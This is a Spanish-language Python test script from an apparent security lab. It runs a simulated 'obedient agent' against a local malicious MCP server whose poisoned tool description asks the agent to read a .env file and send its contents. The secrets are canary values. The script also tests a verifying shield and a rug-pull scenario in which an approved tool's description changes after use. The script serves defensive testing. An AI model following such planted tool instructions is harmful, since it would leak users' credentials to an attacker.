"""Prueba automática del laboratorio, sin Cursor.

Un "agente obediente" simulado (no es una IA) hace lo que diría una descripción
envenenada: lee el .env canario y lo manda. Cada escenario es una sesión del
registro estandarizado (laboratorio/logs/eventos.jsonl):

  A. Sin escudo: el agente habla directo con el servidor malicioso (:9100).
  B. Con escudo: el agente habla con el verificador (:9200).
  C. Rug pull con escudo: una herramienta aprobada cambia su descripción después de usarla.

Si los servidores ya están corriendo, los reutiliza y los reinicia; si no, los levanta.

Uso (con el Python de .venv-scanners):
  python laboratorio/prueba_automatica.py              # los tres escenarios
  python laboratorio/prueba_automatica.py --escenario B
"""
import argparse
import asyncio
import datetime as dt
import json
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

from mcp import ClientSession
from mcp.client.streamable_http import streamablehttp_client

AQUI = Path(__file__).resolve().parent
sys.path.insert(0, str(AQUI))
import eventos  # noqa: E402

PY = sys.executable
CANARIO = "API_KEY=CANARIO-ARQUISOFT-0001\nDB_PASSWORD=CANARIO-ARQUISOFT-0002"
CONECTOR, ESCUDO = "http://127.0.0.1:9100", "http://127.0.0.1:9200"
TITULOS = {"A": "Sin escudo: agente → conector malicioso",
           "B": "Con escudo: agente → escudo → conector malicioso",
           "C": "Rug pull con escudo: la herramienta cambia después de aprobarla"}


def agente(evento, mensaje, **kw):
    eventos.registrar("agente", evento, mensaje, **kw)
    print(f"   {mensaje}")


def reiniciar(base):
    try:
        urllib.request.urlopen(urllib.request.Request(base + "/reiniciar", method="POST"), timeout=5).read()
        return True
    except Exception:
        return False


async def responde(url):
    try:
        async with streamablehttp_client(url) as (r, w, _):
            async with ClientSession(r, w) as s:
                await s.initialize()
                return True
    except Exception:
        return False


async def esperar(url, intentos=40):
    for _ in range(intentos):
        if await responde(url):
            return
        await asyncio.sleep(0.25)
    raise RuntimeError(f"No responde {url}")


async def con_sesion(url, accion):
    async with streamablehttp_client(url) as (r, w, _):
        async with ClientSession(r, w) as s:
            await s.initialize()
            return await accion(s)


async def listar(url):
    herramientas = await con_sesion(url, lambda s: s.list_tools())
    nombres = [t.name for t in herramientas.tools]
    agente("agente.lista_recibida", f"El agente recibió {len(nombres)} herramientas: {', '.join(nombres)}",
           metodo="tools/list", detalle={"herramientas": nombres})
    return herramientas.tools


async def llamar(url, nombre, argumentos, motivo):
    agente("agente.llamada", f"El agente llama a {nombre}: {motivo}", metodo="tools/call", herramienta=nombre,
           severidad=3 if "CANARIO" in json.dumps(argumentos) else 1, argumentos=argumentos)
    res = await con_sesion(url, lambda s: s.call_tool(nombre, argumentos))
    texto = res.content[0].text if res.content else ""
    agente("agente.respuesta", f"Respuesta a {nombre}: {'BLOQUEADA' if res.isError else 'OK'} · {texto[:140]}",
           metodo="tools/call", herramienta=nombre, severidad=2 if res.isError else 1,
           accion="Denied" if res.isError else "Allowed")
    return res


async def obedecer(url):
    """El agente lista las herramientas y sigue la que pida el .env."""
    herramientas = await listar(url)
    trampa = [t for t in herramientas if ".env" in (t.description or "")]
    for t in trampa:
        agente("agente.obedece", f"El agente lee la descripción de {t.name} y decide seguir su 'paso técnico': leer el .env y mandarlo",
               herramienta=t.name, severidad=4, detalle={"descripcion": t.description})
        await llamar(url, t.name, {"monto": 250, "notas": CANARIO}, "adjunta el contenido del .env en notas")
    if not trampa:
        agente("agente.sin_trampa", "Ninguna herramienta visible pide el .env: el agente no tiene orden escondida que seguir")


def levantar(script):
    return subprocess.Popen([PY, script], cwd=str(AQUI.parent), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


async def preparar_servidores(con_escudo):
    propios = []
    if not await responde(CONECTOR + "/mcp"):
        propios.append(levantar("laboratorio/servidor_malicioso.py"))
        await esperar(CONECTOR + "/mcp")
    reiniciar(CONECTOR)
    if con_escudo:
        if not await responde(ESCUDO + "/mcp"):
            propios.append(levantar("laboratorio/verificador.py"))
            await esperar(ESCUDO + "/mcp")
        reiniciar(ESCUDO)
    return propios


async def escenario(clave):
    con_escudo = clave in ("B", "C")
    print(f"\n=== {clave} · {TITULOS[clave]} ===")
    propios = await preparar_servidores(con_escudo)
    sesion = eventos.nueva_sesion(f"{clave}-{dt.datetime.now():%H%M%S}")
    agente("agente.sesion", f"Escenario {clave}: {TITULOS[clave]}", detalle={"escudo": con_escudo})
    url = (ESCUDO if con_escudo else CONECTOR) + "/mcp"
    try:
        await obedecer(url)
        if clave == "B":
            await llamar(url, "calcular_iva", {"monto": 250, "notas": CANARIO}, "la intenta usar por su nombre aunque no aparece")
            await llamar(url, "clima", {"ciudad": CANARIO}, "intenta sacar el .env por una herramienta limpia")
            await llamar(url, "clima", {"ciudad": "Santa Cruz"}, "uso normal")
        if clave == "C":
            await llamar(url, "tipo_de_cambio", {"moneda": "USD"}, "uso normal de una herramienta aprobada")
            await obedecer(url)
            await llamar(url, "tipo_de_cambio", {"moneda": "USD"}, "segundo uso, después del cambio de descripción")
    finally:
        for p in propios:
            p.terminate()
            p.wait(timeout=10)
        time.sleep(0.3)
    lista = eventos.leer(sesion["sesion"])
    quiebre, defensa = eventos.puntos_clave(lista)
    if quiebre:
        print(f"   → SE ROMPIÓ a las {quiebre['@timestamp'][11:23]}: {quiebre['mensaje']}")
    elif defensa:
        print(f"   → FRENADO a las {defensa['@timestamp'][11:23]}: {defensa['mensaje']}")
    return sesion["sesion"], bool(quiebre)


async def main(claves):
    resultados = [await escenario(c) for c in claves]
    print("\n=== Resumen ===")
    for sesion, roto in resultados:
        print(f"   {sesion}: {'canario robado' if roto else 'sin robo'}")
    print("   Registro estandarizado: laboratorio/logs/eventos.jsonl")


if __name__ == "__main__":
    if sys.platform == "win32":
        sys.stdout.reconfigure(encoding="utf-8")
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--escenario", choices=["A", "B", "C"], help="corre solo un escenario")
    args = ap.parse_args()
    asyncio.run(main([args.escenario] if args.escenario else ["A", "B", "C"]))
